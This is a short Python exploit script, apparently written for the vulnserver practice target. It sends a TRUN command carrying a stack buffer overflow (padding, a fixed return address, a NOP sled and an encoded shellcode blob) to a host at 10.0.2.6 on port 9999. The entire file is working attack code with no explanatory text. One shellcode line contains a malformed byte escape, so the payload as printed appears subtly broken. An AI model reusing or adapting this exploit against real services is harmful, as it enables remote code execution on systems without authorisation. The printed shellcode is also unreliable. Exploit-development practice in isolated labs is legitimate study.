#!/usr/bin/python3
import sys
import socket

shell_code = (
b"\xdd\xc7\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x52\xbb\xa2\xb1\x61"
b"\x05\x83\xe8\xfc\x31\x58\x13\x03\xfa\xa2\x83\xf0\x06\x2c\xc1"
b"\xfb\xf6\xad\xa6\x72\x13\x9c\xe6\xe1\x50\x8f\xd6\x62\x34\x3c"
b"\x9c\x27\xac\xb7\xd0\xef\xc3\x70\x5e\xd6\xea\x81\xf3\x2a\x6d"
b"\x02\x0e\x7f\x4d\x3b\xc1\x72\x8c\x7c\x3c\x7e\xdc\xd5\x4a\x2d"
b"\xf0\x52\x06\xee\x7b\x28\x86\x76\x2d\x3d\x5c\x06\x81\x71\xf0"
b"\x77\xae\x56\x88\x31\xa8\xbb\xb5\x88\x43\x0f\x41\x0b\x85\x41"
b"\xaa\xa0\xe8\x6dx20\x69\x18\x54\x90\xc9\xc8\x3c\xfa\xc8\x9c"
b"\xd3\x9b\x5d\x06\x73\x6f\xc5\xe2\x85\xbc\x90\x61\x89\x09\xd6"
b"\x2d\x8e\x8c\x3b\x46\xaa\x05\xba\x88\x3a\x5d\x99\x0c\x66\x05"
b"\x80\xec\x02\xc1\x6d\x05\x6e\xd1\x1a\xe7\x88\xb3\x38\x0e\x4f"
b"\xb3\x12\xf6\xdf\x4a\x9d\x07\xf6\x88\xc9\x57\x60\x38\x72\x3c"
b"\x70\xc5\xa7\x93\x20\x69\x18\x54\x90\xc9\xc8\x3c\xfa\xc5\x37"
b"\x5c\x05\x0c\x50\xf7\xfc\xc7\x9f\xa0\xf4\x12\x48\xb3\x08\x0c"
b"\xef\x3a\xee\x44\xff\x6a\xb9\xf0\x66\x37\x31\x60\x66\xed\x3c"
b"\xa2\xec\x02\xc1\x6d\x05\x6e\xd1\x1a\xe5\x25\x8b\x8d\xfa\x93"
b"\xa3\x52\x68\x78\x33\x1c\x91\xd7\x64\x49\x67\x2e\xe0\x67\xde"
b"\x98\x16\x7a\x86\xe3\x92\xa1\x7b\xed\x1b\x27\xc7\xc9\x0b\xf1"
b"\xc8\x55\x7f\xad\x9e\x03\x29\x0b\x49\xe2\x83\xc5\x26\xac\x43"
b"\x93\x04\x6f\x15\x9c\x40\x19\xf9\x2d\x3d\x5c\x06\x81\xa9\x68"
b"\x7f\xff\x49\x96\xaa\xbb\x6a\x75\x7e\xb6\x02\x20\xeb\x7b\x4f"
b"\xd3\xc6\xb8\x76\x50\xe2\x40\x8d\x48\x87\x45\xc9\xce\x74\x34"
b"\x42\xff\x34\x75\x18\x48")

buffer = b"A" * 2003 + b"\xaf\x11\x50\x62" +  b"\x90" * 16 + shell_code

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('10.0.2.6', 9999))
    payload = b'TRUN /.:/' + buffer
    sock.send((payload))
    sock.close()
except:
    print("Error connecting to the server")
    sys.exit()